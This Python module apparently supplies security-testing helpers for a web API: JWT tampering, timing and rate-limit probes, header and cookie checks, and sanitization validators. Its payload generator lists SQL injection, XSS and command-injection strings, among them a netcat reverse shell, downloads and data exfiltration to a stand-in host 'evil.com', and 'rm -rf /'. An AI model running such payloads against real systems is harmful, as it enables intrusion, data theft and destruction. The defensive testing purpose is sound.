"""
Security testing utilities and helper functions.
Provides common security testing patterns and validation functions.
"""

from __future__ import annotations

import asyncio
import hashlib
import hmac
import secrets
import time
from datetime import datetime
from typing import Any

import jwt
from httpx import AsyncClient, Response


class SecurityTestUtils:
    """Utility class for security testing operations."""

    @staticmethod
    def generate_secure_token(length: int = 32) -> str:
        """Generate a cryptographically secure random token."""
        return secrets.token_urlsafe(length)

    @staticmethod
    def create_hmac_signature(data: str, secret: str) -> str:
        """Create HMAC signature for data integrity testing."""
        return hmac.new(secret.encode(), data.encode(), hashlib.sha256).hexdigest()

    @staticmethod
    def verify_hmac_signature(data: str, signature: str, secret: str) -> bool:
        """Verify HMAC signature."""
        expected = SecurityTestUtils.create_hmac_signature(data, secret)
        return hmac.compare_digest(expected, signature)

    @staticmethod
    def extract_jwt_payload(
        token: str, secret: str, verify: bool = True
    ) -> dict[str, Any]:
        """Extract JWT payload with optional verification."""
        try:
            if verify:
                return jwt.decode(token, secret, algorithms=["HS256"])
            return jwt.decode(token, options={"verify_signature": False})
        except jwt.InvalidTokenError as e:
            msg = f"Invalid JWT token: {e}"
            raise ValueError(msg) from e

    @staticmethod
    def create_tampered_jwt(original_token: str, tamper_payload: dict[str, Any]) -> str:
        """Create a tampered JWT for security testing."""
        try:
            # Decode without verification
            payload = jwt.decode(original_token, options={"verify_signature": False})

            # Apply tampering
            payload.update(tamper_payload)

            # Re-encode with wrong secret (will have invalid signature)
            return jwt.encode(payload, "wrong_secret", algorithm="HS256")
        except Exception as e:
            msg = f"Failed to create tampered JWT: {e}"
            raise ValueError(msg) from e

    @staticmethod
    async def measure_response_time(
        client: AsyncClient, method: str, url: str, **kwargs
    ) -> tuple[Response, float]:
        """Measure HTTP response time for timing attack detection."""
        start_time = time.time()

        if method.upper() == "GET":
            response = await client.get(url, **kwargs)
        elif method.upper() == "POST":
            response = await client.post(url, **kwargs)
        elif method.upper() == "PUT":
            response = await client.put(url, **kwargs)
        elif method.upper() == "DELETE":
            response = await client.delete(url, **kwargs)
        else:
            msg = f"Unsupported HTTP method: {method}"
            raise ValueError(msg)

        end_time = time.time()
        response_time = end_time - start_time

        return response, response_time

    @staticmethod
    def analyze_timing_patterns(
        response_times: list[float], threshold: float = 0.1
    ) -> dict[str, Any]:
        """Analyze response times for timing attack vulnerabilities."""
        if not response_times:
            return {"vulnerable": False, "reason": "No data"}

        avg_time = sum(response_times) / len(response_times)
        max_time = max(response_times)
        min_time = min(response_times)
        time_variance = max_time - min_time

        # Calculate standard deviation
        variance = sum((t - avg_time) ** 2 for t in response_times) / len(
            response_times
        )
        std_dev = variance**0.5

        vulnerable = time_variance > threshold or std_dev > (threshold / 2)

        return {
            "vulnerable": vulnerable,
            "average_time": avg_time,
            "max_time": max_time,
            "min_time": min_time,
            "variance": time_variance,
            "std_deviation": std_dev,
            "threshold": threshold,
            "sample_size": len(response_times),
        }

    @staticmethod
    def validate_security_headers(response: Response) -> dict[str, Any]:
        """Validate security headers in HTTP response."""
        headers = response.headers
        security_checks = {}

        # Check for security headers
        security_headers: dict[str, Any] = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": ["DENY", "SAMEORIGIN"],
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": None,  # Should exist in production
            "Content-Security-Policy": None,  # Should exist
            "Referrer-Policy": None,  # Should exist
        }

        for header_name, expected_values in security_headers.items():
            header_value = headers.get(header_name)

            if header_value is None:
                security_checks[header_name] = {
                    "present": False,
                    "secure": False,
                    "value": None,
                }
            else:
                if expected_values is None:
                    # Header should exist but value is flexible
                    security_checks[header_name] = {
                        "present": True,
                        "secure": True,
                        "value": header_value,
                    }
                elif isinstance(expected_values, list):
                    # Header should have one of the expected values
                    secure = header_value in expected_values
                    security_checks[header_name] = {
                        "present": True,
                        "secure": secure,
                        "value": header_value,
                        "expected": expected_values,
                    }
                else:
                    # Header should have specific value
                    secure = header_value == expected_values
                    security_checks[header_name] = {
                        "present": True,
                        "secure": secure,
                        "value": header_value,
                        "expected": expected_values,
                    }

        # Overall security score
        total_headers = len(security_headers)
        secure_headers = sum(
            1 for check in security_checks.values() if check.get("secure", False)
        )
        security_score = secure_headers / total_headers

        return {
            "headers": security_checks,
            "security_score": security_score,
            "secure_headers_count": secure_headers,
            "total_headers_count": total_headers,
        }

    @staticmethod
    def check_cookie_security(response: Response) -> dict[str, Any]:
        """Check security attributes of cookies in response."""
        cookies = response.cookies
        cookie_security = {}

        for cookie_name, cookie in cookies.items():
            security_attrs = {
                "httponly": getattr(cookie, "httponly", False),
                "secure": getattr(cookie, "secure", False),
                "samesite": getattr(cookie, "samesite", None),
                "domain": getattr(cookie, "domain", None),
                "max_age": getattr(cookie, "max_age", None),
                "path": getattr(cookie, "path", "/"),
            }

            # Evaluate security
            security_score = 0
            total_checks = 4

            if security_attrs["httponly"]:
                security_score += 1

            if security_attrs["secure"]:
                security_score += 1

            if security_attrs["samesite"] in ["strict", "lax"]:
                security_score += 1

            if security_attrs["path"] == "/" or security_attrs["path"]:
                security_score += 1

            cookie_security[cookie_name] = {
                "attributes": security_attrs,
                "security_score": security_score / total_checks,
                "secure": security_score >= 3,  # At least 3/4 security features
            }

        return cookie_security

    @staticmethod
    def detect_information_disclosure(response: Response) -> dict[str, Any]:
        """Detect potential information disclosure in response."""
        content = response.text.lower()
        headers = {k.lower(): v for k, v in response.headers.items()}

        disclosure_patterns = {
            "stack_traces": [
                "traceback",
                "stack trace",
                "exception",
                "error at line",
                "sqlalchemy",
                "fastapi",
                "uvicorn",
                "python",
            ],
            "database_errors": [
                "sql",
                "mysql",
                "postgresql",
                "sqlite",
                "database error",
                "syntax error",
                "table doesn't exist",
            ],
            "system_info": [
                "windows",
                "linux",
                "ubuntu",
                "centos",
                "server version",
                "php version",
                "apache",
                "nginx",
            ],
            "sensitive_paths": [
                "/etc/passwd",
                "/etc/shadow",
                "c:\\windows",
                "web.config",
                ".env",
                "config.py",
                "settings.py",
            ],
            "debug_info": [
                "debug mode",
                "development",
                "test environment",
                "debug=true",
                "verbose",
            ],
        }

        disclosures = {}

        for category, patterns in disclosure_patterns.items():
            found_patterns = [pattern for pattern in patterns if pattern in content]
            disclosures[category] = {
                "found": len(found_patterns) > 0,
                "patterns": found_patterns,
                "count": len(found_patterns),
            }

        # Check headers for disclosure
        header_disclosures = {}
        sensitive_headers = ["server", "x-powered-by", "x-aspnet-version"]

        for header in sensitive_headers:
            if header in headers:
                header_disclosures[header] = headers[header]

        total_disclosures = sum(
            len(disclosure["patterns"]) for disclosure in disclosures.values()
        )

        return {
            "content_disclosures": disclosures,
            "header_disclosures": header_disclosures,
            "total_disclosure_count": total_disclosures + len(header_disclosures),
            "has_disclosures": total_disclosures > 0 or len(header_disclosures) > 0,
        }

    @staticmethod
    async def test_rate_limiting(
        client: AsyncClient,
        endpoint: str,
        max_requests: int = 10,
        time_window: int = 60,
        **request_kwargs,
    ) -> dict[str, Any]:
        """Test rate limiting implementation."""
        start_time = time.time()
        responses = []

        for i in range(max_requests):
            try:
                response = await client.post(endpoint, **request_kwargs)
                responses.append({
                    "attempt": i + 1,
                    "status_code": response.status_code,
                    "response_time": time.time() - start_time,
                    "headers": dict(response.headers),
                    "rate_limited": response.status_code == 429,
                })

                # Small delay between requests
                await asyncio.sleep(0.1)

            except Exception as e:
                responses.append({
                    "attempt": i + 1,
                    "status_code": None,
                    "error": str(e),
                    "response_time": time.time() - start_time,
                })

        # Analyze results
        rate_limited_responses = [r for r in responses if r.get("rate_limited")]
        successful_responses = [
            r for r in responses if r.get("status_code") and r["status_code"] < 400
        ]

        return {
            "total_requests": len(responses),
            "successful_requests": len(successful_responses),
            "rate_limited_requests": len(rate_limited_responses),
            "rate_limiting_effective": len(rate_limited_responses) > 0,
            "first_rate_limit_at": (
                rate_limited_responses[0]["attempt"] if rate_limited_responses else None
            ),
            "responses": responses,
            "test_duration": time.time() - start_time,
        }

    @staticmethod
    def generate_attack_payloads(payload_type: str) -> list[str]:
        """Generate specific types of attack payloads."""
        payloads = {
            "sql_injection": [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "admin'--",
                "1; INSERT INTO users VALUES ('hacker', 'password'); --",
                "' UNION SELECT * FROM users --",
                "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                "' OR 1=1#",
                "'; EXEC xp_cmdshell('dir'); --",
                "1' OR SLEEP(5)--",
                "' UNION SELECT null,username,password FROM users--",
            ],
            "xss": [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                "javascript:alert('XSS')",
                '<img src=x onerror=alert("XSS")>',
                '<iframe src="javascript:alert(1)"></iframe>',
                '<svg onload=alert("XSS")>',
                '<body onload=alert("XSS")>',
                '<input type="image" src=x onerror=alert("XSS")>',
                "';alert('XSS');//",
                '<script>document.location="http://evil.com"</script>',
            ],
            "command_injection": [
                "; cat /etc/passwd",
                "| whoami",
                "&& rm -rf /",
                "`id`",
                "$(whoami)",
                "; nc -e /bin/sh evil.com 4444",
                "| powershell.exe -Command Get-Process",
                "&& wget http://evil.com/shell.php",
                "; curl -O http://evil.com/malware",
                "$(curl http://evil.com/exfiltrate?data=$(whoami))",
            ],
            "ldap_injection": [
                "*)(uid=*))(|(uid=*",
                "admin)(&(password=*))",
                "*)(&(objectClass=user))",
                "*))%00",
                "admin)((|",
                "*)(|(cn=*))",
            ],
            "xpath_injection": [
                "' or '1'='1",
                "' or 1=1 or ''='",
                "x' or name()='username' or 'x'='y",
                "test' and count(//*)=1 and 'a'='a",
                "' and string-length(name(parent::*))>0 and '1'='1",
            ],
        }

        return payloads.get(payload_type, [])

    @staticmethod
    def validate_input_sanitization(
        original_input: str, processed_output: str, payload_type: str = "xss"
    ) -> dict[str, Any]:
        """Validate input sanitization effectiveness."""
        dangerous_patterns = {
            "xss": [
                "<script",
                "</script>",
                "javascript:",
                "onload=",
                "onerror=",
                "onclick=",
                "onmouseover=",
                "onfocus=",
                "eval(",
                "alert(",
                "document.cookie",
                "document.location",
            ],
            "sql": [
                "drop table",
                "delete from",
                "insert into",
                "update set",
                "union select",
                "exec ",
                "xp_",
                "--",
                "/*",
                "*/",
            ],
            "command": [
                "|",
                "&",
                ";",
                "`",
                "$",
                "rm -",
                "cat ",
                "wget ",
                "curl ",
                "nc ",
                "sh ",
                "bash ",
                "cmd ",
                "powershell",
            ],
        }

        patterns = dangerous_patterns.get(payload_type, dangerous_patterns["xss"])

        original_lower = original_input.lower()
        output_lower = processed_output.lower()

        found_in_original = [p for p in patterns if p in original_lower]
        found_in_output = [p for p in patterns if p in output_lower]

        sanitization_effective = len(found_in_output) < len(found_in_original)
        removed_patterns = [p for p in found_in_original if p not in found_in_output]
        remaining_patterns = [p for p in found_in_original if p in found_in_output]

        return {
            "sanitization_effective": sanitization_effective,
            "original_threats": len(found_in_original),
            "remaining_threats": len(found_in_output),
            "removed_patterns": removed_patterns,
            "remaining_patterns": remaining_patterns,
            "sanitization_score": (
                (len(found_in_original) - len(found_in_output))
                / max(len(found_in_original), 1)
            ),
        }

    @staticmethod
    def check_session_security(
        session_data: dict[str, Any], required_attributes: list[str] | None = None
    ) -> dict[str, Any]:
        """Check security attributes of session data."""
        if required_attributes is None:
            required_attributes = [
                "user_id",
                "created_at",
                "last_activity",
                "ip_address",
                "user_agent",
            ]

        security_checks = {}

        # Check required attributes
        for attr in required_attributes:
            security_checks[f"has_{attr}"] = attr in session_data

        # Check session age
        if "created_at" in session_data:
            try:
                created_time = datetime.fromisoformat(session_data["created_at"])
                age_seconds = (datetime.utcnow() - created_time).total_seconds()
                security_checks["session_age_seconds"] = age_seconds
                security_checks["session_expired"] = age_seconds > 3600  # 1 hour
            except (ValueError, TypeError):
                security_checks["session_age_seconds"] = None
                security_checks["session_expired"] = True

        # Check last activity
        if "last_activity" in session_data:
            try:
                last_activity = datetime.fromisoformat(session_data["last_activity"])
                idle_seconds = (datetime.utcnow() - last_activity).total_seconds()
                security_checks["idle_seconds"] = idle_seconds
                security_checks["session_idle_too_long"] = idle_seconds > 1800  # 30 min
            except (ValueError, TypeError):
                security_checks["idle_seconds"] = None
                security_checks["session_idle_too_long"] = True

        # Overall security score
        required_checks = [f"has_{attr}" for attr in required_attributes]
        passed_checks = sum(
            1 for check in required_checks if security_checks.get(check)
        )
        security_score = passed_checks / len(required_checks)

        return {
            "checks": security_checks,
            "security_score": security_score,
            "secure": security_score >= 0.8
            and not security_checks.get("session_expired"),
        }

    @staticmethod
    def generate_csrf_token(secret: str, session_id: str) -> str:
        """Generate a CSRF token for testing."""
        timestamp = str(int(time.time()))
        data = f"{session_id}:{timestamp}"
        signature = SecurityTestUtils.create_hmac_signature(data, secret)
        return f"{timestamp}:{signature}"

    @staticmethod
    def verify_csrf_token(
        token: str, secret: str, session_id: str, max_age: int = 3600
    ) -> bool:
        """Verify CSRF token for testing."""
        try:
            timestamp_str, signature = token.split(":", 1)
            timestamp = int(timestamp_str)

            # Check age
            if time.time() - timestamp > max_age:
                return False

            # Verify signature
            data = f"{session_id}:{timestamp_str}"
            expected_signature = SecurityTestUtils.create_hmac_signature(data, secret)

            return hmac.compare_digest(expected_signature, signature)
        except (ValueError, IndexError):
            return False


class SecurityAssertions:
    """Custom assertions for security testing."""

    @staticmethod
    def assert_no_timing_attack_vulnerability(
        response_times: list[float],
        threshold: float = 0.1,
        message: str = "Potential timing attack vulnerability detected",
    ):
        """Assert that response times don't indicate timing attack vulnerability."""
        analysis = SecurityTestUtils.analyze_timing_patterns(response_times, threshold)
        assert not analysis["vulnerable"], f"{message}: {analysis}"

    @staticmethod
    def assert_security_headers_present(
        response: Response,
        required_headers: list[str] | None = None,
        message: str = "Required security headers missing",
    ):
        """Assert that required security headers are present."""
        if required_headers is None:
            required_headers = ["X-Content-Type-Options", "X-Frame-Options"]

        missing_headers = [
            header for header in required_headers if header not in response.headers
        ]

        assert not missing_headers, f"{message}: {missing_headers}"

    @staticmethod
    def assert_cookie_security(
        response: Response,
        cookie_name: str,
        message: str = "Cookie security attributes not properly set",
    ):
        """Assert that cookie has proper security attributes."""
        cookie_security = SecurityTestUtils.check_cookie_security(response)

        assert cookie_name in cookie_security, f"Cookie {cookie_name} not found"

        cookie_info = cookie_security[cookie_name]
        assert cookie_info["secure"], f"{message}: {cookie_info}"

    @staticmethod
    def assert_no_information_disclosure(
        response: Response, message: str = "Information disclosure detected"
    ):
        """Assert that response doesn't contain information disclosure."""
        disclosure_info = SecurityTestUtils.detect_information_disclosure(response)
        assert not disclosure_info["has_disclosures"], f"{message}: {disclosure_info}"

    @staticmethod
    def assert_input_sanitized(
        original_input: str,
        processed_output: str,
        payload_type: str = "xss",
        message: str = "Input sanitization ineffective",
    ):
        """Assert that input has been properly sanitized."""
        validation = SecurityTestUtils.validate_input_sanitization(
            original_input, processed_output, payload_type
        )
        assert validation["sanitization_effective"], f"{message}: {validation}"

    @staticmethod
    def assert_rate_limiting_effective(
        rate_limit_test_result: dict[str, Any],
        message: str = "Rate limiting not effective",
    ):
        """Assert that rate limiting is working effectively."""
        assert rate_limit_test_result["rate_limiting_effective"], (
            f"{message}: {rate_limit_test_result}"
        )


# Decorator for security test cases
def security_test(test_type: str = "general"):
    """Decorator to mark and configure security tests."""

    def decorator(func):
        func._security_test_type = test_type
        func._is_security_test = True
        return func

    return decorator
